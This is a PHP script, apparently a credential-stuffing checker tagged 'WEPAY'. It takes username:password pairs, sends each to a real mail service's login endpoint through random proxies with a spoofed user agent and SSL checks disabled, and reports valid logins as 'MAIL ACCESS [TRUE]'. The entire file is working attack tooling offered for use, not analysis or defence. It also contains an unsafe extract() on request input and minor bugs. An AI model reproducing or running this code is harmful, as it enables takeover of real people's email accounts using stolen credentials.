<?php

// WEPAY

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode(":", $lista);
$user = $separa[0];
$pass = $separa[1];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();



$ch = curl_init();

curl_setopt($ch, CURLOPT_GET, true);
curl_setopt($ch, CURLOPT_URL, 'https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login='.$user.'&Password='.$pass.'');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array( 
  'Accept-Encoding: gzip, deflate, br',
'Accept-Language: en-US,en;q=0.9',
'Connection: keep-alive',
'Host: aj-https.my.com',
'Sec-Fetch-Dest: document',
'Sec-Fetch-Mode: navigate',
'Sec-Fetch-Site: none',
'Sec-Fetch-User: ?1',
'Upgrade-Insecure-Requests: 1',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'));

curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
 echo  $result = curl_exec($ch);
$s = json_decode($result, true);



if (strpos($result, '1')) {
  echo '<span class="badge badge-success">#SUCCESS</span> <span class="badge badge-success">🤖</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">🤖</span> <span class="badge badge-success"> ★ 🍺MAIL ACCESS🍺[TRUE] </span></br> </span> <span class="badge badge-dark"></span> <span class="badge badge-dark"> 🔥DUSTIΠ_βΔβΔ🔥♛</span></br>';
}
elseif (strpos($result, "0")) {
  echo '<span class="badge badge-info">#ERROR </span> <span class="badge badge-info">🤖</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success"></span> <span class="badge badge-success"> ★ ERROR </span></br> </span> <span class="badge badge-dark"></span> <span class="badge badge-dark">🔥DUSTIΠ_βΔβΔ🔥♛ </span></br>';
}


curl_close($ch);
ob_flush();

///////////////////////////////////////////////===========xD========\\\\\\\\\\\\\\\
?>